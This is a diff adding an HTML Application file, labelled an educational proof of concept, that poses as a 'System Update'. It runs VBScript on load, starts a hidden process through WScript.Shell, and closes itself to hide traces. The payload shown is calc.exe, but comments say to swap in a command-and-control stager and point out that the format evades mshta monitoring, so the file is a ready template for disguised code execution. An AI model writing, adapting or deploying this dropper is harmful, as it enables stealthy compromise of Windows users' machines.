@@ -1,0 +1,38 @@
+<!-- AutoClick_HTA - HTML Application Payload
+     Educational Proof-of-Concept
+     HTAs execute as full applications outside the browser sandbox 
+-->
+<html>
+<head>
+<title>System Update</title>
+<HTA:APPLICATION 
+     ID="objAutoClick" 
+     APPLICATIONNAME="SysUpdate"
+     SCROLL="no"
+     SINGLEINSTANCE="yes"
+     WINDOWSTATE="minimize"
+>
+</head>
+<script language="VBScript">
+    Sub Window_OnLoad
+        ' Zero Click - Executes immediately on load
+        ExecutePayload
+        ' Close the window to hide traces
+        self.Close
+    End Sub
+
+    Sub ExecutePayload
+        Dim shell
+        Set shell = CreateObject("WScript.Shell")
+        
+        ' Payload: Calc (Replace with C2 stager)
+        shell.Run "calc.exe", 0, False
+        
+        ' Note: mshta.exe is often monitored, but this file format
+        ' allows native VBScript execution on Windows.
+    End Sub
+</script>
+<body>
+    <!-- Content is invisible due to windowstate=minimize and fast close -->
+</body>
+</html>
